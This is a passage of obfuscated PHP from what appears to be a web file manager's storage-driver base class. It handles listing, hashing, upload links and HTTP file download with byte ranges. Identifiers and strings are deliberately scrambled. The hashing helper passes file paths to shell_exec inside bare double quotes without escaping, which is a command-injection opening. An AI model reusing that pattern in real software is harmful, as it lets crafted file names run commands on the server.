'') { if (!$ÂÚ∑®™ª) { $ÂÚ∑®™ª = rand_string(15); } $π˛≤¯™ê = TEMP_FILES . rand_string(15) . $_SERVER[ˆë€Ï⁄∂][8]; @mkdir($π˛≤¯™ê, DEFAULT_PERRMISSIONS, !0); $ÖÖ®ÚÒŸ = $π˛≤¯™ê . $ÂÚ∑®™ª; @touch($ÖÖ®ÚÒŸ); if ($–ﬂ¨∆Ú¨) { file_put_contents($ÖÖ®ÚÒŸ, $–ﬂ¨∆Ú¨); } return $ÖÖ®ÚÒŸ; } public function tempFileRemve($’ˆó‡˙´) { @unlink($’ˆó‡˙´); @rmdir($this->pathFather($’ˆó‡˙´)); } public function mkfile($∞àŒÛ÷ì, $÷ôòª⁄¡ = '', $Í“„«∑¶ = REPEAT_RENAME) { } public function mkdir($Ó…ëÏ⁄¥, $¡°É‹êÂ = REPEAT_SKIP) { } public function delFile($Ú‡’˘Ìú) { } public function delFolder($±·áÿê…) { } public function copyFile($≈÷¬„©∫, $¬ÿöºœÀ) { } public function moveFile($˙ÛÄà∏ƒ, $î£îùŒÈ) { } public function remove($ÔåµÓ¢õ) { if ($this->isFile($ÔåµÓ¢õ)) { return $this->delFile($ÔåµÓ¢õ); } return $this->delFolder($ÔåµÓ¢õ); } public function rename($îç∫‹ú‘, $ï±ÇÀ∑Ì) { } public function exist($–Ωñæ™°) { } public function findByHash($⁄Œ€ä´— = '', $Ôäé≥óÔ = '') { return !1; } public function isFile($ñ„Æ™»ç) { } public function isFolder($„∆´¥ÖÛ) { } public function size($”æ˘§ÌÏ) { } public function info($ÎÏË…õ∏) { } public function infoSimple($Ÿ›ÏÆáﬁ) { return $this->info($Ÿ›ÏÆáﬁ); } public function infoAuth($Ñ‚ÔÆ£¶) { return $this->info($Ñ‚ÔÆ£¶); } public function infoFull($„Œ⁄◊Èê) { return $this->info($„Œ⁄◊Èê); } public function infoFullSimple($¢•»Ö±Ÿ) { return $this->info($¢•»Ö±Ÿ); } public function infoWithChildren($∆√„ÛØæ) { $ÌÃŸ∑”® =& $_SERVER[ˆë€Ï⁄∂]; static $€‚ó⁄ï◊ = array(); if (isset($€‚ó⁄ï◊[$∆√„ÛØæ])) { return $€‚ó⁄ï◊[$∆√„ÛØæ]; } $≤úñ∞Ñº = $this->info($∆√„ÛØæ); if ($≤úñ∞Ñº && $≤úñ∞Ñº[$ÌÃŸ∑”®[33]] == $ÌÃŸ∑”®[88]) { $ßú˚≠©⁄ = array($ÌÃŸ∑”®[89] => 0, $ÌÃŸ∑”®[90] => 0, $ÌÃŸ∑”®[91] => 0); $this->infoChildren($∆√„ÛØæ, $ßú˚≠©⁄); $≤úñ∞Ñº[$ÌÃŸ∑”®[89]] = $ßú˚≠©⁄[$ÌÃŸ∑”®[89]]; $≤úñ∞Ñº[$ÌÃŸ∑”®[92]] = array($ÌÃŸ∑”®[93] => $ßú˚≠©⁄[$ÌÃŸ∑”®[90]], $ÌÃŸ∑”®[94] => $ßú˚≠©⁄[$ÌÃŸ∑”®[91]]); $€‚ó⁄ï◊[$∆√„ÛØæ] = $≤úñ∞Ñº; } return $≤úñ∞Ñº; } public function listPath($ÿÖà•œ∑, $µ„≠π∫ú = false) { } public function has($ß†≥≥∏≠, $±ÔÎπˆè = false, $–‰Ã„∆◊ = false) { } public function canRead($µÕÛëÁ∆) { } public function canWrite($∆¯¶á∫€) { } public function getContent($îä¸ı“) { } public function setContent($ìÃ€Á®˘, $Î’å“™Í = '') { } protected function infoChildren($à¬‹˝Ôï, &$πá˘˛„Å) { $‘⁄”´™ñ =& $_SERVER[ˆë€Ï⁄∂]; check_abort_echo(); $ú‹¨ïˆπ = $this->listPath($à¬‹˝Ôï, !0); $ú‹¨ïˆπ = array_merge($ú‹¨ïˆπ[$‘⁄”´™ñ[95]], $ú‹¨ïˆπ[$‘⁄”´™ñ[96]]); foreach ($ú‹¨ïˆπ as $ÈØ±ﬁ…∆) { if ($ÈØ±ﬁ…∆[$‘⁄”´™ñ[33]] == $‘⁄”´™ñ[88]) { $πá˘˛„Å[$‘⁄”´™ñ[91]]++; $≠Îü–¬ù = $this->getPathInner($ÈØ±ﬁ…∆[$‘⁄”´™ñ[97]]); $this->infoChildren($≠Îü–¬ù, $πá˘˛„Å); } else { $πá˘˛„Å[$‘⁄”´™ñ[90]]++; $πá˘˛„Å[$‘⁄”´™ñ[89]] += $ÈØ±ﬁ…∆[$‘⁄”´™ñ[89]]; } } } public function fileSubstr($éõ¶Âôπ, $ÜÁö˘íÇ, $æÃª€≥‰) { } public function listAll($À≈œ®»ø) { } public function listAllMake($⁄Ãì´ƒ’, &$ª—Ôï†Ù) { $¥í÷ü≠è =& $_SERVER[ˆë€Ï⁄∂]; check_abort_echo(); $çâ‚å˜˘ = $this->listPath($⁄Ãì´ƒ’, !0); if (!$çâ‚å˜˘) { return; } $Ì≥¯ˆÃË = array_merge($çâ‚å˜˘[$¥í÷ü≠è[95]], $çâ‚å˜˘[$¥í÷ü≠è[96]]); foreach ($Ì≥¯ˆÃË as $ÀÆä®ªÌ) { $˙â®©¶„ = $ÀÆä®ªÌ[$¥í÷ü≠è[33]] == $¥í÷ü≠è[88]; $•Ï®÷≥È = array($¥í÷ü≠è[97] => $ÀÆä®ªÌ[$¥í÷ü≠è[97]], $¥í÷ü≠è[88] => $˙â®©¶„); if (isset($ÀÆä®ªÌ[$¥í÷ü≠è[89]])) { $•Ï®÷≥È[$¥í÷ü≠è[89]] = $ÀÆä®ªÌ[$¥í÷ü≠è[89]]; } if (isset($ÀÆä®ªÌ[$¥í÷ü≠è[98]])) { $•Ï®÷≥È[$¥í÷ü≠è[98]] = $ÀÆä®ªÌ[$¥í÷ü≠è[98]]; } if (!$˙â®©¶„) { $ª—Ôï†Ù[] = $•Ï®÷≥È; continue; } $ª—Ôï†Ù[] = $•Ï®÷≥È; $ßª ıﬁü = $ÀÆä®ªÌ[$¥í÷ü≠è[97]]; $üÿî§Ç“ = $this->pathDriver; if (substr($ÀÆä®ªÌ[$¥í÷ü≠è[97]], 0, strlen($üÿî§Ç“)) == $üÿî§Ç“) { $ßª ıﬁü = substr($ßª ıﬁü, strlen($üÿî§Ç“)); } $this->listAllMake($ßª ıﬁü, $ª—Ôï†Ù); } } public function listAllSimple($ñü˚… π, $ê˝ˆﬂîè = false) { $˘˘ìï‘ÿ = $this->listAll($ñü˚… π); return $this->listAllSimpleMake($˘˘ìï‘ÿ, $this->getPathOuter($ñü˚… π), $ê˝ˆﬂîè); } public function listAllSimpleMake($Ω¡ô•®ç, $∂±–¬ Î, $«•«∏⁄Î) { $õòÛ∏®ﬂ =& $_SERVER[ˆë€Ï⁄∂]; $ªç±¡» = array(); $∂±–¬ Î = rtrim(get_path_father($∂±–¬ Î), $õòÛ∏®ﬂ[8]) . $õòÛ∏®ﬂ[8]; foreach ($Ω¡ô•®ç as $È€ìº¬) { $˘ÁÀ∞”« = array($õòÛ∏®ﬂ[97] => $È€ìº¬[$õòÛ∏®ﬂ[97]], $õòÛ∏®ﬂ[99] => $È€ìº¬[$õòÛ∏®ﬂ[97]], $õòÛ∏®ﬂ[88] => $È€ìº¬[$õòÛ∏®ﬂ[88]]); if (isset($È€ìº¬[$õòÛ∏®ﬂ[89]]) && !$È€ìº¬[$õòÛ∏®ﬂ[88]]) { $˘ÁÀ∞”«[$õòÛ∏®ﬂ[89]] = $È€ìº¬[$õòÛ∏®ﬂ[89]]; } if (isset($È€ìº¬[$õòÛ∏®ﬂ[98]])) { $˘ÁÀ∞”«[$õòÛ∏®ﬂ[98]] = $È€ìº¬[$õòÛ∏®ﬂ[98]]; } if (is_array($È€ìº¬[$õòÛ∏®ﬂ[100]])) { $˘ÁÀ∞”«[$õòÛ∏®ﬂ[99]] = $È€ìº¬[$õòÛ∏®ﬂ[100]][$õòÛ∏®ﬂ[97]]; $˘ÁÀ∞”«[$õòÛ∏®ﬂ[89]] = $È€ìº¬[$õòÛ∏®ﬂ[100]][$õòÛ∏®ﬂ[89]]; $˘ÁÀ∞”«[$õòÛ∏®ﬂ[98]] = $È€ìº¬[$õòÛ∏®ﬂ[100]][$õòÛ∏®ﬂ[98]]; } else { if (substr($È€ìº¬[$õòÛ∏®ﬂ[97]], 0, strlen($∂±–¬ Î)) == $∂±–¬ Î) { $˘ÁÀ∞”«[$õòÛ∏®ﬂ[97]] = substr($È€ìº¬[$õòÛ∏®ﬂ[97]], strlen($∂±–¬ Î)); } } $∂Î–å¡Ô = $È€ìº¬[$õòÛ∏®ﬂ[88]] ? $õòÛ∏®ﬂ[8] : $õòÛ∏®ﬂ[12]; $˘ÁÀ∞”«[$õòÛ∏®ﬂ[99]] = rtrim($˘ÁÀ∞”«[$õòÛ∏®ﬂ[99]], $õòÛ∏®ﬂ[8]) . $∂Î–å¡Ô; $˘ÁÀ∞”«[$õòÛ∏®ﬂ[97]] = $õòÛ∏®ﬂ[8] . trim($˘ÁÀ∞”«[$õòÛ∏®ﬂ[97]], $õòÛ∏®ﬂ[8]) . $∂Î–å¡Ô; if (!$«•«∏⁄Î) { $ÿùÏ€«≠ = explode($õòÛ∏®ﬂ[8], trim($˘ÁÀ∞”«[$õòÛ∏®ﬂ[97]], $õòÛ∏®ﬂ[8])); $˘ÁÀ∞”«[$õòÛ∏®ﬂ[97]] = $õòÛ∏®ﬂ[8] . implode($õòÛ∏®ﬂ[8], array_slice($ÿùÏ€«≠, 1)) . $∂Î–å¡Ô; } $ªç±¡»[] = $˘ÁÀ∞”«; } return array_sort_by($ªç±¡», $õòÛ∏®ﬂ[97]); } public function upload($°…à‚ËÑ, $˝√˛¨ÉÃ, $·˛çÄÄ‰ = false, $ÙË◊çÙ… = REPEAT_REPLACE) { } public function uploadFileByID($∫¢”∏∆Ô, $⁄æÅØÙâ, $Çë˚•´í) { } public function uploadFileByPath($ÍÀ·–·∫, $°ö◊◊©ﬂ, $ƒç•ÑÀ∫ = array()) { } public function isUploadServer() { $·≥£ÌôÙ =& $_SERVER[ˆë€Ï⁄∂]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $·≥£ÌôÙ[101]) { return !0; } return $GLOBALS[$·≥£ÌôÙ[6]][$·≥£ÌôÙ[102]][$·≥£ÌôÙ[103]]; } public function isFileOutServer() { $›¯∫…—ø =& $_SERVER[ˆë€Ï⁄∂]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $›¯∫…—ø[101]) { return !0; } return $GLOBALS[$›¯∫…—ø[6]][$›¯∫…—ø[102]][$›¯∫…—ø[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ê§≈«ˆÆ) { $Ôœü ≈˛ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->isCdnHost()) { return $Ê§≈«ˆÆ; } return str_replace(trim(get_url_root($Ê§≈«ˆÆ), $Ôœü ≈˛[8]), trim($this->cdnHost, $Ôœü ≈˛[8]), $Ê§≈«ˆÆ); } public function uploadLink($±ôÖ∑‰Ï, $¯≈¯âú” = 0) { $û–úºŸ˝ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->isUploadServer()) { return; } $¥Ä»’¸› = $this->getType(); if (!in_array($¥Ä»’¸›, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $äÔóœ≈Â = 1024 * 1024 * 10; $ÓΩÊò˝˛ = $¯≈¯âú” <= $äÔóœ≈Â ? $û–úºŸ˝[105] : $û–úºŸ˝[106]; $∏◊âƒ◊≈ = (!$¯≈¯âú” ? 1 : ceil($¯≈¯âú” / pow(1024, 3))) * 3600 * 4; $öÒêó¿• = $this->{$ÓΩÊò˝˛}($±ôÖ∑‰Ï, $∏◊âƒ◊≈); if ($öÒêó¿•) { $öÒêó¿•[$û–úºŸ˝[107]] = $±ôÖ∑‰Ï; $öÒêó¿•[$û–úºŸ˝[108]] = $¥Ä»’¸›; } return $öÒêó¿•; } public function uploadFormData($∑ı§ÅÉ√, $Ë›óùÖ‰ = 3600) { } public function uploadMultiData($§ñ ‹ ®, $òÕï¿—‹ = 3600) { } public function multiUploadFormData($Œƒ®µ∂ƒ, $ùóÌ˙—π = 3600) { return $this->uploadMultiData($Œƒ®µ∂ƒ, $ùóÌ˙—π); } public function download($è˝âÄŒ—, $≈‘≥Òêπ) { } public function ext($Ëº´Äçì) { $ÔÍé≠ÖÙ =& $_SERVER[ˆë€Ï⁄∂]; if (strpos($Ëº´Äçì, $ÔÍé≠ÖÙ[8]) === -1) { $˛ü§»ã± = $Ëº´Äçì; } else { $˛ü§»ã± = $this->pathThis($Ëº´Äçì); } $ﬂΩ®‹˝¯ = $ÔÍé≠ÖÙ[12]; if (strstr($˛ü§»ã±, $ÔÍé≠ÖÙ[10])) { $ﬂΩ®‹˝¯ = substr($˛ü§»ã±, strrpos($˛ü§»ã±, $ÔÍé≠ÖÙ[10]) + 1); $ﬂΩ®‹˝¯ = strtolower($ﬂΩ®‹˝¯); } if (strlen($ﬂΩ®‹˝¯) > 3 && preg_match($ÔÍé≠ÖÙ[109], $ﬂΩ®‹˝¯, $Ôá¸ºÉ’)) { $ﬂΩ®‹˝¯ = $ÔÍé≠ÖÙ[12]; } return $ﬂΩ®‹˝¯; } public function pathThis($ªÆ¥¨†∏) { $∑…»„Äí =& $_SERVER[ˆë€Ï⁄∂]; $ªÆ¥¨†∏ = str_replace($∑…»„Äí[110], $∑…»„Äí[8], rtrim($ªÆ¥¨†∏, $∑…»„Äí[8])); $Ï¨∆ıÇø = strrpos($ªÆ¥¨†∏, $∑…»„Äí[8]); if ($Ï¨∆ıÇø === !1) { return $ªÆ¥¨†∏; } return substr($ªÆ¥¨†∏, $Ï¨∆ıÇø + 1); } public function pathFather($ò≠˚∫¶Â) { $≈ïá¢¡˛ =& $_SERVER[ˆë€Ï⁄∂]; $ò≠˚∫¶Â = str_replace($≈ïá¢¡˛[110], $≈ïá¢¡˛[8], rtrim($ò≠˚∫¶Â, $≈ïá¢¡˛[8])); $‘¥˘ı±« = strrpos($ò≠˚∫¶Â, $≈ïá¢¡˛[8]); if ($‘¥˘ı±« === !1) { return $≈ïá¢¡˛[12]; } return substr($ò≠˚∫¶Â, 0, $‘¥˘ı±« + 1); } public function hashSimple($ã›Ï÷´ß) { $«íˆÂ“∑ =& $_SERVER[ˆë€Ï⁄∂]; if (!$ã›Ï÷´ß) { return md5($«íˆÂ“∑[12]); } $õØáÊ‰ﬁ = $this->size($ã›Ï÷´ß); $¥ﬂéﬁÖ” = 200; $Ç≤õ‚Ó≠ = 50; if ($õØáÊ‰ﬁ <= $¥ﬂéﬁÖ” * $Ç≤õ‚Ó≠) { return $this->hashMd5($ã›Ï÷´ß) . $õØáÊ‰ﬁ; } $ë±ﬂé≤‹ = intval($õØáÊ‰ﬁ / $Ç≤õ‚Ó≠); $ˆÇí—¿ˆ = $«íˆÂ“∑[12]; for ($›∞ÚáÄî = 0; $›∞ÚáÄî < $Ç≤õ‚Ó≠; $›∞ÚáÄî++) { $ˆÇí—¿ˆ .= $this->fileSubstr($ã›Ï÷´ß, $ë±ﬂé≤‹ * $›∞ÚáÄî, $¥ﬂéﬁÖ”); } $ˆÇí—¿ˆ .= $this->fileSubstr($ã›Ï÷´ß, $õØáÊ‰ﬁ - $¥ﬂéﬁÖ”, $¥ﬂéﬁÖ”); return md5($ˆÇí—¿ˆ) . $õØáÊ‰ﬁ; } public static $md5Cache = array(); public function hashMd5($‰±¬å©˛) { if (!$‰±¬å©˛) { return md5($_SERVER[ˆë€Ï⁄∂][12]); } $‰±¬å©˛ = $this->iconvSystem($‰±¬å©˛); if (isset(self::$md5Cache[$‰±¬å©˛])) { return self::$md5Cache[$‰±¬å©˛]; } self::$md5Cache[$‰±¬å©˛] = $this->hashMd5Shell($‰±¬å©˛); if (!self::$md5Cache[$‰±¬å©˛]) { self::$md5Cache[$‰±¬å©˛] = @md5_file($‰±¬å©˛); } return self::$md5Cache[$‰±¬å©˛]; } private function hashMd5Shell($πÈùÃ≠å) { $á∏ë¨îñ =& $_SERVER[ˆë€Ï⁄∂]; if (!$πÈùÃ≠å) { return md5($á∏ë¨îñ[12]); } if (!function_exists($á∏ë¨îñ[111])) { return !1; } $˘·Œ≥æ‘ = array($á∏ë¨îñ[112], $á∏ë¨îñ[113]); $Ïöﬁñ∏ñ = Cache::get($á∏ë¨îñ[114]); if (!$Ïöﬁñ∏ñ) { $á≠ÁÚÀ˚ = BASIC_PATH . $á∏ë¨îñ[115]; $ô˝óë˙é = md5_file($á≠ÁÚÀ˚); $Ïöﬁñ∏ñ = $á∏ë¨îñ[116]; foreach ($˘·Œ≥æ‘ as $ÂÔ˚√ˆ∞) { $ı±˘ı‹ö = shell_exec($ÂÔ˚√ˆ∞ . "\40\42{$á≠ÁÚÀ˚}\x22"); if ($ı±˘ı‹ö && substr(trim($ı±˘ı‹ö), 0, 32) == $ô˝óë˙é) { $Ïöﬁñ∏ñ = $ÂÔ˚√ˆ∞; break; } } Cache::set($á∏ë¨îñ[114], $Ïöﬁñ∏ñ, 3600); } if ($Ïöﬁñ∏ñ == $á∏ë¨îñ[116]) { return !1; } $ı±˘ı‹ö = shell_exec($Ïöﬁñ∏ñ . "\40\42{$πÈùÃ≠å}\42"); $ı±˘ı‹ö = str_replace($á∏ë¨îñ[117], $á∏ë¨îñ[12], $ı±˘ı‹ö); return substr($ı±˘ı‹ö, 0, 32); } public function link($¸¡ÙÚÌ¯) { return $¸¡ÙÚÌ¯; } public function fileOut($‡À®ﬁ‰Ω, $¨∑˙µÂó = false, $äÂ¡Ë≥∑ = false, $πô≠◊Ïà = '') { $â¡Ùâ‘∂ =& $_SERVER[ˆë€Ï⁄∂]; $this->cacheMethod(null, null); if (!$‡À®ﬁ‰Ω || !$this->exist($‡À®ﬁ‰Ω)) { show_json(LNG($â¡Ùâ‘∂[118]), !1, $äÂ¡Ë≥∑); } $Æ¶∞˝Íø = $this->getType() == $â¡Ùâ‘∂[119]; $˚ö“®ìÉ = $GLOBALS[$â¡Ùâ‘∂[6]][$â¡Ùâ‘∂[102]][$â¡Ùâ‘∂[120]][$â¡Ùâ‘∂[121]]; $‹§Ç˛¬Ò = (double) $GLOBALS[$â¡Ùâ‘∂[6]][$â¡Ùâ‘∂[102]][$â¡Ùâ‘∂[120]][$â¡Ùâ‘∂[122]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $˝Ò‘ÑÿÁ = $this->infoFull($‡À®ﬁ‰Ω); $Í˛û¸Ö√ = $˝Ò‘ÑÿÁ[$â¡Ùâ‘∂[89]]; $≈ëÙ≠”ë = gmdate($â¡Ùâ‘∂[123], $˝Ò‘ÑÿÁ[$â¡Ùâ‘∂[98]]); $°á∫â◊ê = $äÂ¡Ë≥∑ ? $äÂ¡Ë≥∑ : $this->iconvApp($˝Ò‘ÑÿÁ[$â¡Ùâ‘∂[32]]); $Á˛‚îÔÇ = 0; $ÙΩ—’ñÏ = $Í˛û¸Ö√ - 1; $–π√ß≈ﬁ = $this->ext($°á∫â◊ê); if (in_array($–π√ß≈ﬁ, array($â¡Ùâ‘∂[124], $â¡Ùâ‘∂[125], $â¡Ùâ‘∂[126], $â¡Ùâ‘∂[127]))) { $–π√ß≈ﬁ = $â¡Ùâ‘∂[128]; } if (in_array($–π√ß≈ﬁ, array($â¡Ùâ‘∂[129]))) { $–π√ß≈ﬁ = $â¡Ùâ‘∂[130]; } if (!$πô≠◊Ïà) { $πô≠◊Ïà = md5($≈ëÙ≠”ë . $Í˛û¸Ö√); } $πô≠◊Ïà = $â¡Ùâ‘∂[131] . $πô≠◊Ïà . $â¡Ùâ‘∂[131]; $‚ÔûÍßã = get_file_mime($–π√ß≈ﬁ); $≥Á‹ÁØÕ = !0; $≥Á‹ÁØÕ = isset($_GET[$â¡Ùâ‘∂[132]]) ? !1 : !0; if ($¨∑˙µÂó === !1 && !mime_support($‚ÔûÍßã)) { $‚ÔûÍßã = $â¡Ùâ‘∂[133]; } header($â¡Ùâ‘∂[134]); header($â¡Ùâ‘∂[135] . $‚ÔûÍßã); $Ìé°∞ñ∂ = rawurlencode($°á∫â◊ê); $Ìé°∞ñ∂ = $â¡Ùâ‘∂[131] . $Ìé°∞ñ∂ . $â¡Ùâ‘∂[136] . $Ìé°∞ñ∂; if ($¨∑˙µÂó) { header($â¡Ùâ‘∂[137]); header($â¡Ùâ‘∂[138] . $Ìé°∞ñ∂); } else { if ($≥Á‹ÁØÕ) { header($â¡Ùâ‘∂[139] . $Ìé°∞ñ∂); } } $˛Ç¥õπø = 3600 * 24 * 30; header($â¡Ùâ‘∂[140]); header($â¡Ùâ‘∂[141]); header($â¡Ùâ‘∂[142] . $˛Ç¥õπø); header($â¡Ùâ‘∂[143] . gmdate($â¡Ùâ‘∂[123], time() + $˛Ç¥õπø) . $â¡Ùâ‘∂[144]); if (isset($_SERVER[$â¡Ùâ‘∂[145]]) && strtotime($_SERVER[$â¡Ùâ‘∂[145]]) == $˝Ò‘ÑÿÁ[$â¡Ùâ‘∂[98]]) { header($â¡Ùâ‘∂[146], !0, 304); die; } if (isset($_SERVER[$â¡Ùâ‘∂[147]]) && $_SERVER[$â¡Ùâ‘∂[147]] == $πô≠◊Ïà) { header($â¡Ùâ‘∂[148] . $πô≠◊Ïà, !0, 304); die; } header($â¡Ùâ‘∂[148] . $πô≠◊Ïà); header($â¡Ùâ‘∂[149] . $≈ëÙ≠”ë . $â¡Ùâ‘∂[144]); header($â¡Ùâ‘∂[150] . $°á∫â◊ê); header($â¡Ùâ‘∂[151]); header($â¡Ùâ‘∂[152] . $Í˛û¸Ö√); header($â¡Ùâ‘∂[153]); Hook::trigger($â¡Ùâ‘∂[154], $‡À®ﬁ‰Ω, $Í˛û¸Ö√, $°á∫â◊ê, $–π√ß≈ﬁ); if (!$¨∑˙µÂó && $–π√ß≈ﬁ == $â¡Ùâ‘∂[155]) { if ($Í˛û¸Ö√ > 1024 * 1024 * 5) { die; } $êÊ´ª≤Û = $this->getContent($‡À®ﬁ‰Ω); $êÊ´ª≤Û = Html::clearSVG($êÊ´ª≤Û); header($â¡Ùâ‘∂[156] . strlen($êÊ´ª≤Û)); echo $êÊ´ª≤Û; die; } $Ê∆˝áí¢ = strtolower($_SERVER[$â¡Ùâ‘∂[157]]); if ($Æ¶∞˝Íø && $Ê∆˝áí¢ && $˚ö“®ìÉ) { if (strstr($Ê∆˝áí¢, $â¡Ùâ‘∂[158])) { header($â¡Ùâ‘∂[159] . $‡À®ﬁ‰Ω); } else { if (strstr($Ê∆˝áí¢, $â¡Ùâ‘∂[160])) { header($â¡Ùâ‘∂[161] . $‡À®ﬁ‰Ω); } else { if (strstr($Ê∆˝áí¢, $â¡Ùâ‘∂[162])) { header($â¡Ùâ‘∂[163] . $‡À®ﬁ‰Ω); } } } if ($‹§Ç˛¬Ò) { header($â¡Ùâ‘∂[164] . $‹§Ç˛¬Ò); } return; } if (isset($_SERVER[$â¡Ùâ‘∂[165]])) { if (preg_match($â¡Ùâ‘∂[166], $_SERVER[$â¡Ùâ‘∂[165]], $ÿ˚»ø≤ú)) { $Á˛‚îÔÇ = intval($ÿ˚»ø≤ú[1]); $Á˛‚îÔÇ = $Á˛‚îÔÇ <= 0 ? 0 : ($Á˛‚îÔÇ >= $ÙΩ—’ñÏ ? $ÙΩ—’ñÏ : $Á˛‚îÔÇ); if (!empty($ÿ˚»ø≤ú[2])) { $ç¿Ô˛·í = intval($ÿ˚»ø≤ú[2]); $ÙΩ—’ñÏ = $ç¿Ô˛·í < $Á˛‚îÔÇ ? $Á˛‚îÔÇ : ($ç¿Ô˛·í >= $ÙΩ—’ñÏ ? $ÙΩ—’ñÏ : $ç¿Ô˛·í); } } header($â¡Ùâ‘∂[167]); header("\103\157\156\x74\145\x6e\x74\x2d\x52\141\x6e\147\145\72\40\142\x79\164\145\x73\40{$Á˛‚îÔÇ}\x2d{$ÙΩ—’ñÏ}\57" . $Í˛û¸Ö√); } else { header($â¡Ùâ‘∂[168]); } header($â¡Ùâ‘∂[169]); header($â¡Ùâ‘∂[170]); $ûÀÉ∑”Ç = !0; if ($_SERVER[$â¡Ùâ‘∂[171]] == $â¡Ùâ‘∂[172] && $Í˛û¸Ö√ > 1204 * 1024 * 1024 * 2) { $ûÀÉ∑”Ç = !1; } if ($ûÀÉ∑”Ç) { header($â¡Ùâ‘∂[173] . ($ÙΩ—’ñÏ - $Á˛‚îÔÇ + 1)); } if ($_SERVER[$â¡Ùâ‘∂[174]] == $â¡Ùâ‘∂[175]) { return; } $˜äÓÑ“ª = array($â¡Ùâ‘∂[176] => !1, $â¡Ùâ‘∂[177] => $Á˛‚îÔÇ, $â¡Ùâ‘∂[178] => $ÙΩ—’ñÏ, $â¡Ùâ‘∂[179] => $–π√ß≈ﬁ, $â¡Ùâ‘∂[180] => $˝Ò‘ÑÿÁ, $â¡Ùâ‘∂[181] => $â¡Ùâ‘∂[12], $â¡Ùâ‘∂[182] => 0); $˜äÓÑ“ª = Hook::filter($â¡Ùâ‘∂[183], $˜äÓÑ“ª); $Á•„„À¨ = 1024 * 300; $äã’˛…´ = 0; if ($‹§Ç˛¬Ò) { $äã’˛…´ = intval(1000 * 1000 * ($Á•„„À¨ / $‹§Ç˛¬Ò)); } while ($Á˛‚îÔÇ <= $ÙΩ—’ñÏ) { $“ÊÈ˛∞  = timeFloat(); check_abort(); $∆ﬁ‡˘œÉ = $ÙΩ—’ñÏ - $Á˛‚îÔÇ + 1; if ($∆ﬁ‡˘œÉ <= $Á•„„À¨) { $Á•„„À¨ = $∆ﬁ‡˘œÉ; } $êÊ´ª≤Û = $this->fileSubstr($‡À®ﬁ‰Ω, $Á˛‚îÔÇ, $Á•„„À¨); if ($˜äÓÑ“ª[$â¡Ùâ‘∂[176]]) { $˜äÓÑ“ª[$â¡Ùâ‘∂[181]] = $êÊ´ª≤Û; $˜äÓÑ“ª[$â¡Ùâ‘∂[182]] = $Á˛‚îÔÇ; $˜äÓÑ“ª = Hook::filter($â¡Ùâ‘∂[184], $˜äÓÑ“ª); $êÊ´ª≤Û = $˜äÓÑ“ª[$â¡Ùâ‘∂[181]]; } echo $êÊ´ª≤Û; $Á˛‚îÔÇ += $Á•„„À¨; if ($Á•„„À¨ == $∆ﬁ‡˘œÉ) { $Á˛‚îÔÇ = $ÙΩ—’ñÏ + 1; } if ($äã’˛…´) { $∏ﬁ˚ÁÂâ = intval(1000 * 1000 * (timeFloat() - $“ÊÈ˛∞ )); $˚ˆ¢ˆΩ‘ = $äã’˛…´ - $∏ﬁ˚ÁÂâ; if ($˚ˆ¢ˆΩ‘ > 5) { usleep($˚ˆ¢ˆΩ‘); } } } } public function fileOutServer($•ÌØ–Íœ, $ØÃÛ›Õ∏ = false, $çäŒ˝¶¢ = false, $∂µò›©ü = '') { $this->fileOut($•ÌØ–Íœ, $ØÃÛ›Õ∏, $çäŒ˝¶¢, $∂µò›©ü); } public function fileOutLink($◊Ñ›¥≈¯) { header($_SERVER[ˆë€Ï⁄∂][185] . $◊Ñ›¥≈¯); die; } public function cacheMethod($éÊÈá≤ô, $Ëó©öˆü, $øèÜ⁄∂π = null) { $ ê´ÈÏ =& $_SERVER[ˆë€Ï⁄∂]; static $ƒÔû¢•∂ = array(); $øÕ√‚“À = $Ëó©öˆü ? ltrim($this->getPathOuter($Ëó©öˆü), $ ê´ÈÏ[8]) : $ ê´ÈÏ[12]; $¿û˚ú—ƒ = $ ê´ÈÏ[186] . $éÊÈá≤ô . $ ê´ÈÏ[187] . rtrim($øÕ√‚“À, $ ê´ÈÏ[8]); if (is_null($éÊÈá≤ô)) { $ƒÔû¢•∂ = array(); return; } if (is_null($Ëó©öˆü)) { foreach ($ƒÔû¢•∂ as $¿û˚ú—ƒ => $åë≈àŸ¯) { if (!strstr($¿û˚ú—ƒ, $ ê´ÈÏ[186] . $éÊÈá≤ô . $ ê´ÈÏ[188])) { continue; } unset($ƒÔû¢•∂[$¿û˚ú—ƒ]); } return; } if (!is_null($øèÜ⁄∂π)) { $ƒÔû¢•∂[$¿û˚ú—ƒ] = $øèÜ⁄∂π; return; } $¿Ç…Úâ÷ = isset($ƒÔû¢•∂[$¿û˚ú—ƒ]) ? $ƒÔû¢•∂[$¿û˚ú—ƒ] : null; if (!is_null($¿Ç…Úâ÷)) { return $¿Ç…Úâ÷; } $¿Ç…Úâ÷ = $this->{$éÊÈá≤ô}($Ëó©öˆü); $ƒÔû¢•∂[$¿û˚ú—ƒ] = $¿Ç…Úâ÷; return $¿Ç…Úâ÷; } public function cacheMethodInfoSet($±•ñè´û, $àå†¸≥Î, $˜û∆‹›´ = false) { $‘¥Ï…‡– =& $_SERVER[ˆë€Ï⁄∂]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($‘¥Ï…‡–[189], $±•ñè´û, $àå†¸≥Î); $this->cacheMethod($‘¥Ï…‡–[190], $±•ñè´û, $àå†¸≥Î ? !1 : !0); if (is_array($˜û∆‹›´)) { $this->cacheMethod($‘¥Ï…‡–[191], $±•ñè´û, $˜û∆‹›´); } } public function fileOutImage($…∆É˝—, $ç˚”≈ì• = 250) { $ÕÖﬁ⁄Ω≈ =& $_SERVER[ˆë€Ï⁄∂]; set_timeout(); if (substr($…∆É˝—, 0, 4) == $ÕÖﬁ⁄Ω≈[162]) { $this->fileOutLink($…∆É˝—); } $†ù◊∞ÿ÷ = $this->info($…∆É˝—); $›ùæ«÷± = !1; $¢‹ù¶æ— = isset($GLOBALS[$ÕÖﬁ⁄Ω≈[192]]) ? $GLOBALS[$ÕÖﬁ⁄Ω≈[192]] : array(); if ($¢‹ù¶æ— && $¢‹ù¶æ—[$ÕÖﬁ⁄Ω≈[193]] == 